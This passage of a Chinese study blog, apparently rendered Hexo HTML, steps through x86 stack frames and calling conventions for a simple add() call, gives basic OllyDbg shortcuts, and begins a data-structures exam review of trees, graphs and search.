+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MOV DWORD PTR SS:[EBP-4],1			&#x2F;&#x2F;a</span><br><span class="line">MOV DWORD PTR SS:[EBP-8],2			&#x2F;&#x2F;b</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>绝对地址</th>
+<th>相对地址</th>
+<th>内容</th>
+<th>指针</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0019FF20</td>
+<td>EBP-8</td>
+<td>2</td>
+<td>ESP</td>
+</tr>
+<tr>
+<td>0019FF24</td>
+<td>EBP-4</td>
+<td>1</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF28</td>
+<td>EBP</td>
+<td>0019FF70【执行main函数前EBP的地址】</td>
+<td>EBP</td>
+</tr>
+</tbody></table>
+<p>3.调用add(a,b)函数，首先要传递参数a和b，这里是使用了EAX和ECX寄存器</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">MOV EAX,DWORD PTR SS:[EBP-8]</span><br><span class="line">PUSH EAX                                 ; Arg2 &#x3D;&gt; 2</span><br><span class="line">MOV ECX,DWORD PTR SS:[EBP-4]             </span><br><span class="line">PUSH ECX                                 ; Arg1 &#x3D;&gt; 1</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>ps：这里先压入了b，再压入a,遵循从右向左压入函数的规则</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th>绝对地址</th>
+<th>相对地址</th>
+<th>内容</th>
+<th>指针</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0019FF18</td>
+<td>EBP-10</td>
+<td>1</td>
+<td>ESP</td>
+</tr>
+<tr>
+<td>0019FF1C</td>
+<td>EBP-C</td>
+<td>2</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF20</td>
+<td>EBP-8</td>
+<td>2</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF24</td>
+<td>EBP-4</td>
+<td>1</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF28</td>
+<td>EBP</td>
+<td>0019FF70【执行main函数前EBP的地址】</td>
+<td>EBP</td>
+</tr>
+</tbody></table>
+<p>4.用CALL调用的add函数，调用的同时会把返回地址压入栈中，返回地址指的是CALL语句的下一条语句。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0040103C    CALL 00401000</span><br><span class="line">00401041    ADD ESP,8			&#x2F;&#x2F;call的下一句【非调用内容】</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>绝对地址</th>
+<th>相对地址</th>
+<th>内容</th>
+<th>指针</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0019FF14</td>
+<td>EBP-14</td>
+<td>00401041【call线性关系上的下一条语句】</td>
+<td>ESP</td>
+</tr>
+<tr>
+<td>0019FF18</td>
+<td>EBP-10</td>
+<td>1</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF1C</td>
+<td>EBP-C</td>
+<td>2</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF20</td>
+<td>EBP-8</td>
+<td>2</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF24</td>
+<td>EBP-4</td>
+<td>1</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF28</td>
+<td>EBP</td>
+<td>0019FF70【执行main函数前EBP的地址】</td>
+<td>EBP</td>
+</tr>
+</tbody></table>
+<p>5.将执行main函数时EBP值压入栈，并新生成执行add函数时的栈帧</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PUSH EBP</span><br><span class="line">MOV EBP,ESP</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>绝对地址</th>
+<th>相对地址</th>
+<th>内容</th>
+<th>指针</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0019FF10</td>
+<td>EBP</td>
+<td>0019FF28【执行main函数时，执行add函数前EBP的地址】</td>
+<td>EBP，ESP</td>
+</tr>
+<tr>
+<td>0019FF14</td>
+<td>EBP+4</td>
+<td>00401041【call线性关系上的下一条语句】</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF18</td>
+<td>EBP+8</td>
+<td>1</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF1C</td>
+<td>EBP+C</td>
+<td>2</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF20</td>
+<td>EBP+10</td>
+<td>2</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF24</td>
+<td>EBP+14</td>
+<td>1</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF28</td>
+<td>EBP+18</td>
+<td>0019FF70【执行main函数前EBP的地址】</td>
+<td></td>
+</tr>
+</tbody></table>
+<p>6.先分配8个字节给两个long类型变量x和y，再将参数a，b的值分别赋给它们。【因为push参数时是从右往左，那么调用时先调用靠近栈顶的元素代表从左往右调用】</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">long x&#x3D;a,y&#x3D;b;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">00401003  SUB ESP,8</span><br><span class="line">00401006  MOV EAX,DWORD PTR SS:[EBP+8]</span><br><span class="line">00401009  MOV DWORD PTR SS:[EBP-8],EAX</span><br><span class="line">0040100C  MOV ECX,DWORD PTR SS:[EBP+0C]</span><br><span class="line">0040100F  MOV DWORD PTR SS:[EBP-4],ECX</span><br><span class="line">&#x2F;&#x2F;EAX&#x3D;1，ECX&#x3D;2</span><br><span class="line">&#x2F;&#x2F;赋值顺序似乎是按照传参的顺序，在栈中的顺序赋值和参数上下相同【EBP-8，EBP-4和EBP+8，EBP+0C】</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>绝对地址</th>
+<th>相对地址</th>
+<th align="left">内容</th>
+<th>指针</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0019FF08</td>
+<td>EBP-8</td>
+<td align="left">1</td>
+<td>ESP</td>
+</tr>
+<tr>
+<td>0019FF0C</td>
+<td>EBP-4</td>
+<td align="left">2</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF10</td>
+<td>EBP</td>
+<td align="left">0019FF28【执行main函数时，执行add函数前EBP的地址】</td>
+<td>EBP</td>
+</tr>
+<tr>
+<td>0019FF14</td>
+<td>EBP+4</td>
+<td align="left">00401041【call线性关系上的下一条语句】</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF18</td>
+<td>EBP+8</td>
+<td align="left">1</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF1C</td>
+<td>EBP+C</td>
+<td align="left">2</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF20</td>
+<td>EBP+10</td>
+<td align="left">2</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF24</td>
+<td>EBP+14</td>
+<td align="left">1</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF28</td>
+<td>EBP+18</td>
+<td align="left">0019FF70【执行main函数前EBP的地址】</td>
+<td></td>
+</tr>
+</tbody></table>
+<p>6.计算x+y</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00401012  MOV EAX,DWORD PTR SS:[EBP-8]		&#x2F;&#x2F;先调用栈顶的</span><br><span class="line">00401015  ADD EAX,DWORD PTR SS:[EBP-4]</span><br><span class="line">&#x2F;&#x2F;EAX&#x3D;x+y&#x3D;1+2&#x3D;3</span><br></pre></td></tr></table></figure>
+
+
+
+<p>7.将ESP指向EBP的地址，即从这时开始，局部变量x和y将不再有效</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00401018  MOV ESP,EBP</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>绝对地址</th>
+<th>相对地址</th>
+<th align="left">内容</th>
+<th>指针</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0019FF08</td>
+<td>EBP-8</td>
+<td align="left">1</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF0C</td>
+<td>EBP-4</td>
+<td align="left">2</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF10</td>
+<td>EBP</td>
+<td align="left">0019FF28【执行main函数时，执行add函数前EBP的地址】</td>
+<td>EBP，ESP</td>
+</tr>
+<tr>
+<td>0019FF14</td>
+<td>EBP+4</td>
+<td align="left">00401041【call线性关系上的下一条语句】</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF18</td>
+<td>EBP+8</td>
+<td align="left">1</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF1C</td>
+<td>EBP+C</td>
+<td align="left">2</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF20</td>
+<td>EBP+10</td>
+<td align="left">2</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF24</td>
+<td>EBP+14</td>
+<td align="left">1</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF28</td>
+<td>EBP+18</td>
+<td align="left">0019FF70【执行main函数前EBP的地址】</td>
+<td></td>
+</tr>
+</tbody></table>
+<p>8.弹出栈顶元素【main函数的EBP地址】并且赋值给EBP，此时就完全删除了栈帧</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POP EBP</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>绝对地址</th>
+<th>相对地址</th>
+<th align="left">内容</th>
+<th>指针</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0019FF08</td>
+<td>EBP-8</td>
+<td align="left">1</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF0C</td>
+<td>EBP-4</td>
+<td align="left">2</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF10</td>
+<td>EBP</td>
+<td align="left">0019FF28【执行main函数时，执行add函数前EBP的地址】</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF14</td>
+<td>EBP+4</td>
+<td align="left">00401041【call线性关系上的下一条语句】</td>
+<td>ESP</td>
+</tr>
+<tr>
+<td>0019FF18</td>
+<td>EBP+8</td>
+<td align="left">1</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF1C</td>
+<td>EBP+C</td>
+<td align="left">2</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF20</td>
+<td>EBP+10</td>
+<td align="left">2</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF24</td>
+<td>EBP+14</td>
+<td align="left">1</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF28</td>
+<td>EBP+18</td>
+<td align="left">0019FF70【执行main函数前EBP的地址】</td>
+<td>EBP</td>
+</tr>
+</tbody></table>
+<p>9.RETN相当于弹出栈顶的地址，并JMP过去</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RETN</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>绝对地址</th>
+<th>相对地址</th>
+<th align="left">内容</th>
+<th>指针</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0019FF08</td>
+<td>EBP-8</td>
+<td align="left">1</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF0C</td>
+<td>EBP-4</td>
+<td align="left">2</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF10</td>
+<td>EBP</td>
+<td align="left">0019FF28【执行main函数时，执行add函数前EBP的地址】</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF14</td>
+<td>EBP+4</td>
+<td align="left">00401041【call线性关系上的下一条语句】</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF18</td>
+<td>EBP+8</td>
+<td align="left">1</td>
+<td>ESP</td>
+</tr>
+<tr>
+<td>0019FF1C</td>
+<td>EBP+C</td>
+<td align="left">2</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF20</td>
+<td>EBP+10</td>
+<td align="left">2</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF24</td>
+<td>EBP+14</td>
+<td align="left">1</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF28</td>
+<td>EBP+18</td>
+<td align="left">0019FF70【执行main函数前EBP的地址】</td>
+<td>EBP</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>此时EIP就是00401041</p>
+</blockquote>
+<p>10.由于add函数已经调用结束，也就不需要参数a和b了，所以将它们清理掉</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ADD ESP，8</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>绝对地址</th>
+<th>相对地址</th>
+<th align="left">内容</th>
+<th>指针</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0019FF08</td>
+<td>EBP-8</td>
+<td align="left">1</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF0C</td>
+<td>EBP-4</td>
+<td align="left">2</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF10</td>
+<td>EBP</td>
+<td align="left">0019FF28【执行main函数时，执行add函数前EBP的地址】</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF14</td>
+<td>EBP+4</td>
+<td align="left">00401041【call线性关系上的下一条语句】</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF18</td>
+<td>EBP+8</td>
+<td align="left">1</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF1C</td>
+<td>EBP+C</td>
+<td align="left">2</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF20</td>
+<td>EBP+10</td>
+<td align="left">2</td>
+<td>ESP</td>
+</tr>
+<tr>
+<td>0019FF24</td>
+<td>EBP+14</td>
+<td align="left">1</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF28</td>
+<td>EBP+18</td>
+<td align="left">0019FF70【执行main函数前EBP的地址】</td>
+<td>EBP</td>
+</tr>
+</tbody></table>
+<p>11.调用printf()函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">00401044  PUSH EAX</span><br><span class="line">00401045  PUSH OFFSET 0040B384                     ; ASCII &quot;%d</span><br><span class="line">0040104A  CALL 00401067</span><br><span class="line">0040104F  ADD ESP,8</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;%d\n&quot;,add(a,b));</span><br></pre></td></tr></table></figure>
+
+<p>printf有两个参数，一个是”%d\n”，另一个是add(a,b)的返回值。</p>
+<p>所以从右往左依次压入这些参数，随后调用。</p>
+<p>调用完成后，按规矩清理这两个参数。</p>
+<p>最后栈变成这样：</p>
+<table>
+<thead>
+<tr>
+<th>绝对地址</th>
+<th>相对地址</th>
+<th align="left">内容</th>
+<th>指针</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0019FF08</td>
+<td>EBP-8</td>
+<td align="left">1</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF0C</td>
+<td>EBP-4</td>
+<td align="left">2</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF10</td>
+<td>EBP</td>
+<td align="left">0019FF28【执行main函数时，执行add函数前EBP的地址】</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF14</td>
+<td>EBP+4</td>
+<td align="left">00401041【call线性关系上的下一条语句】</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF18</td>
+<td>EBP+8</td>
+<td align="left">0040B384</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF1C</td>
+<td>EBP+C</td>
+<td align="left">3</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF20</td>
+<td>EBP+10</td>
+<td align="left">2</td>
+<td>ESP</td>
+</tr>
+<tr>
+<td>0019FF24</td>
+<td>EBP+14</td>
+<td align="left">1</td>
+<td></td>
+</tr>
+<tr>
+<td>0019FF28</td>
+<td>EBP+18</td>
+<td align="left">0019FF70【执行main函数前EBP的地址】</td>
+<td>EBP</td>
+</tr>
+</tbody></table>
+<p>12.设置返回值0</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return 0;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XOR EAX，EAX</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>为什么不用<code>MOV EAX，0</code>？</p>
+<p>XOR EAX，EAX执行速度快一些</p>
+</blockquote>
+<p>13.删除main函数的栈帧</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MOV ESP，EBP</span><br><span class="line">POP EBP</span><br></pre></td></tr></table></figure>
+
+<p>之后EBP又指向执行main函数之前EBP地址，一切恢复如初。</p>
+<h1 id="三种函数调用方式"><a href="#三种函数调用方式" class="headerlink" title="三种函数调用方式"></a>三种函数调用方式</h1><h2 id="cdecl"><a href="#cdecl" class="headerlink" title="cdecl"></a>cdecl</h2><ol>
+<li><p>函数的参数以逆序压入栈【从右向左】</p>
+</li>
+<li><p>调用函数RETN后，在调用者函数中</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ADD ESP，n</span><br></pre></td></tr></table></figure>
+
+<p>来清理栈</p>
+</li>
+</ol>
+<h2 id="stdcall"><a href="#stdcall" class="headerlink" title="stdcall"></a>stdcall</h2><ol>
+<li><p>清理栈的任务交给了被调用者函数，在函数返回时</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RETN 8		&#x2F;&#x2F;RETN+POP 8字节</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>这种调用方法<strong>兼容性</strong>更好</p>
+</li>
+</ol>
+<h2 id="fastcall"><a href="#fastcall" class="headerlink" title="fastcall"></a>fastcall</h2><p>正如名字所描述的fast，fastcall通常使用寄存器而非栈内存传递参数，因为访问寄存器通常会快很多。</p>
+<p>但当需要备份、程序复杂时，也不一定就快。</p>
+<h1 id="操作技巧"><a href="#操作技巧" class="headerlink" title="操作技巧"></a>操作技巧</h1><h2 id="Ollydbg"><a href="#Ollydbg" class="headerlink" title="Ollydbg"></a>Ollydbg</h2><h3 id="保存打完补丁的文件"><a href="#保存打完补丁的文件" class="headerlink" title="保存打完补丁的文件"></a>保存打完补丁的文件</h3><ol>
+<li><img src="/2020/12/22/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/0-1.png" alt="0-1"></li>
+<li>在新跳出的页面<img src="/2020/12/22/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/0-2.png" alt="0-2"></li>
+<li>在栈里面跳转到内存地址<img src="/2020/12/22/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/0-3.png" alt="0-3"></li>
+</ol>
+<h3 id="一些操作快捷键"><a href="#一些操作快捷键" class="headerlink" title="一些操作快捷键"></a>一些操作快捷键</h3><p>F7（Step into）：单步执行，有CALL时进入函数</p>
+<p>F8（Step Over）：单步执行，有CALL时不进入CALL的地址</p>
+<p>Ctrl + G（Go to）：转到指定地址</p>
+<p>F2：设置断点</p>
+<p>F9：运行程序到断点处</p>
+<h3 id="小技巧"><a href="#小技巧" class="headerlink" title="小技巧"></a>小技巧</h3><ol>
+<li>不需要某条指令时，可以使用NOP设置为空指令。</li>
+<li>栈窗口点击右键，选择addressing–&gt;relative to EBP,可以把地址调成相对于EBP</li>
+</ol>
+</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/12/22/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E6%80%BB%E7%BB%93/">数据结构复习总结</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-12-22</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/">期末复习</a></span><div class="content"><h1 id="树"><a href="#树" class="headerlink" title="树"></a>树</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p><strong>深度/高度:</strong>   最上面的是第一层【根节点】，最下面的是最后一层。</p>
+<h2 id="树的存储结构表示【p105】"><a href="#树的存储结构表示【p105】" class="headerlink" title="树的存储结构表示【p105】"></a>树的存储结构表示【p105】</h2><h3 id="双亲表示法"><a href="#双亲表示法" class="headerlink" title="双亲表示法"></a>双亲表示法</h3><p>数组第一个单位内储存数据，第二个单位内储存该结点<strong>双亲结点</strong>的数组下标。</p>
+<h3 id="孩子表示法【邻接表法】"><a href="#孩子表示法【邻接表法】" class="headerlink" title="孩子表示法【邻接表法】"></a>孩子表示法【邻接表法】</h3><p>数组第一个单位内储存数据，第二个单位内是一个后继指针，指向它的一个孩子结点，这个孩子结点又指向下一个孩子节点。【也可以增加一个单位来指向该结点的双亲结点】</p>
+<h3 id="孩子兄弟表示法【二叉树表示法】"><a href="#孩子兄弟表示法【二叉树表示法】" class="headerlink" title="孩子兄弟表示法【二叉树表示法】"></a>孩子兄弟表示法【二叉树表示法】</h3><p>每个结点是一个结构体，包括data，firstchild，rightchild三个成员。</p>
+<p>firstchild指向该节点的第一个孩子，rightchild指向该节点的下一个兄弟。</p>
+<h2 id="二叉树"><a href="#二叉树" class="headerlink" title="二叉树"></a>二叉树</h2><h3 id="性质"><a href="#性质" class="headerlink" title="性质"></a>性质</h3><ol>
+<li><p>度为0的结点个数为n0，度为1的结点个数为n1，度为1的结点个数为n1。则</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">n0 &#x3D; n2 + 1     &#x2F;&#x2F;n&#x3D;n0+n1+n2;n&#x3D;side+1;side&#x3D;n1+2*n2;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>具有n个结点的完全二叉树的深度为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[lbn]+1</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>对完全二叉树从根节点开始按顺序编号，如果某结点是i，其左孩子是2i，右孩子是2i+1</p>
+</li>
+</ol>
+<h3 id="二叉树的存储结构"><a href="#二叉树的存储结构" class="headerlink" title="二叉树的存储结构"></a>二叉树的存储结构</h3><h4 id="顺序存储结构"><a href="#顺序存储结构" class="headerlink" title="顺序存储结构"></a>顺序存储结构</h4><p>空的位置数组元素为0，非空的里填数据。</p>
+<p><strong>缺点：</strong>对于空元素比较多，比如单支树，会有很多内存浪费。</p>
+<h4 id="链式存储结构"><a href="#链式存储结构" class="headerlink" title="链式存储结构"></a>链式存储结构</h4><p>每个结点设为一个结构体，设Lchild，Rchild，data，[parent]。</p>
+<h3 id="二叉树的遍历"><a href="#二叉树的遍历" class="headerlink" title="二叉树的遍历"></a>二叉树的遍历</h3><p>先序遍历：根-左子树-右子树</p>
+<p>中序遍历：左子树-根-右子树</p>
+<p>后序遍历：左子树-右子树-根</p>
+<p>按层遍历：借助队列完成遍历</p>
+<h3 id="线索二叉树"><a href="#线索二叉树" class="headerlink" title="线索二叉树"></a>线索二叉树</h3><p>每个结点是一个结构体，包含Lch，LTag，data，RTag，Rch。</p>
+<p>结点有左子树，则指向左子树，否则指向前驱节点。结点有右子树，则指向右子树，否则指向后继结点。</p>
+<p>对于如何连接线索二叉树的前驱和后继结点，只需先写好<strong>中序遍历顺序</strong>即可。</p>
+<h2 id="树、森林、二叉树的转化"><a href="#树、森林、二叉树的转化" class="headerlink" title="树、森林、二叉树的转化"></a>树、森林、二叉树的转化</h2><h3 id="森林转化为二叉树"><a href="#森林转化为二叉树" class="headerlink" title="森林转化为二叉树"></a>森林转化为二叉树</h3><ol>
+<li>把森林里的每一棵树转化为二叉树【除了与第一个孩子的连线全部删掉，将兄弟之间连好】</li>
+<li>依次把右边二叉树的<strong>根节点</strong>作为左边二叉树<strong>根节点的右孩子</strong>。</li>
+</ol>
+<h3 id="二叉树转化为树"><a href="#二叉树转化为树" class="headerlink" title="二叉树转化为树"></a>二叉树转化为树</h3><ol>
+<li>加线。如果某个结点有左孩子，则将该结点与该节点的左孩子的右孩子、右孩子的右孩子……连线。</li>
+<li>去线。删除原二叉树里所有结点与其右孩子的连线。</li>
+</ol>
+<h3 id="二叉树转化为森林"><a href="#二叉树转化为森林" class="headerlink" title="二叉树转化为森林"></a>二叉树转化为森林</h3><p>先判断能不能转化为森林：【根节点有没有右孩子，有则可以】</p>
+<ol>
+<li>如果根节点有右孩子，删除与右孩子连线。接着判断该右孩子有没有右孩子，若有，重复上述操作。</li>
+<li>将分开的几棵二叉树转化为树</li>
+</ol>
+<h2 id="哈夫曼树"><a href="#哈夫曼树" class="headerlink" title="哈夫曼树"></a>哈夫曼树</h2><p>WPL = 所有叶子结点，每个叶子结点，用其权值*到其的线的个数。</p>
+<h3 id="哈夫曼树的创建"><a href="#哈夫曼树的创建" class="headerlink" title="哈夫曼树的创建"></a>哈夫曼树的创建</h3><h3 id="哈夫曼树的编码"><a href="#哈夫曼树的编码" class="headerlink" title="哈夫曼树的编码"></a>哈夫曼树的编码</h3><h1 id="图"><a href="#图" class="headerlink" title="图"></a>图</h1><h2 id="概念-1"><a href="#概念-1" class="headerlink" title="概念"></a>概念</h2><ol>
+<li>图常表示为G(V,E)，G表示一个图，V是图中顶点的集合，E是图中连线的集合。</li>
+<li>如果两顶点之间的连线没有方向，则称这条连线为<strong>边</strong>。如果两顶点之间的连线有方向，则称这条连线为<strong>弧</strong>。箭头出发点叫<strong>弧尾</strong>，箭头指向的叫<strong>弧头</strong>。</li>
+<li><strong>强连通图</strong>：对有向图中的任意两个顶点vi，vj，均有能从vi到vj和从vj到vi。</li>
+</ol>
+<h2 id="图的存储结构"><a href="#图的存储结构" class="headerlink" title="图的存储结构"></a>图的存储结构</h2><h3 id="邻接矩阵表示法"><a href="#邻接矩阵表示法" class="headerlink" title="邻接矩阵表示法"></a>邻接矩阵表示法</h3><h3 id="邻接表-逆连接表表示法"><a href="#邻接表-逆连接表表示法" class="headerlink" title="邻接表/逆连接表表示法"></a>邻接表/逆连接表表示法</h3><p>邻接表：获取出度容易，入度难。</p>
+<p>逆邻接表：获取入度容易，出度难。</p>
+<h3 id="十字链表表示法【p191】"><a href="#十字链表表示法【p191】" class="headerlink" title="十字链表表示法【p191】"></a>十字链表表示法【p191】</h3><p>（图）</p>
+<p>十字链表的每一个结点代表一条弧。</p>
+<h2 id="图的遍历"><a href="#图的遍历" class="headerlink" title="图的遍历"></a>图的遍历</h2><ol>
+<li>深度优先遍历【无法遍历时返回<strong>最接近</strong>的一个可继续遍历的结点继续遍历】</li>
+<li>广度优先遍历</li>
+</ol>
+<h2 id="最小生成树"><a href="#最小生成树" class="headerlink" title="最小生成树"></a>最小生成树</h2><h3 id="普里姆【Prim】算法"><a href="#普里姆【Prim】算法" class="headerlink" title="普里姆【Prim】算法"></a>普里姆【Prim】算法</h3><p>假设未经历过的点为白色，经历过的点为灰色。</p>
+<p>先将出发点变灰，查看由灰色的点出发所能到达的白色点中权值最小的一个，将那个白色点标灰。</p>
+<p>依次类推，直到遍历完所有的点。</p>
+<h3 id="克鲁斯卡尔【Kruskal】算法"><a href="#克鲁斯卡尔【Kruskal】算法" class="headerlink" title="克鲁斯卡尔【Kruskal】算法"></a>克鲁斯卡尔【Kruskal】算法</h3><p>从全图中找到权值最小的那些点，如果连上这些边不会形成回路，则连上这条边。</p>
+<p>重复以上操作，直到遍历完所有的点。</p>
+<h2 id="有向无环图及其应用"><a href="#有向无环图及其应用" class="headerlink" title="有向无环图及其应用"></a>有向无环图及其应用</h2><h3 id="关键路径的计算"><a href="#关键路径的计算" class="headerlink" title="关键路径的计算"></a>关键路径的计算</h3><p>过去求最早用max，回来求最晚用min</p>
+<h3 id="最短路径的计算"><a href="#最短路径的计算" class="headerlink" title="最短路径的计算"></a>最短路径的计算</h3><h4 id="迪杰斯特拉【Dijkstra】算法"><a href="#迪杰斯特拉【Dijkstra】算法" class="headerlink" title="迪杰斯特拉【Dijkstra】算法"></a>迪杰斯特拉【Dijkstra】算法</h4><h1 id="查找"><a href="#查找" class="headerlink" title="查找"></a>查找</h1><h2 id="概念-2"><a href="#概念-2" class="headerlink" title="概念"></a>概念</h2><p>ASL（Average Search Length）=YASL+NASL</p>
+<h2 id="几种表的查找"><a href="#几种表的查找" class="headerlink" title="几种表的查找"></a>几种表的查找</h2><h3 id="顺序表的查找"><a href="#顺序表的查找" class="headerlink" title="顺序表的查找"></a>顺序表的查找</h3><p>YASL=(n+1)/2</p>
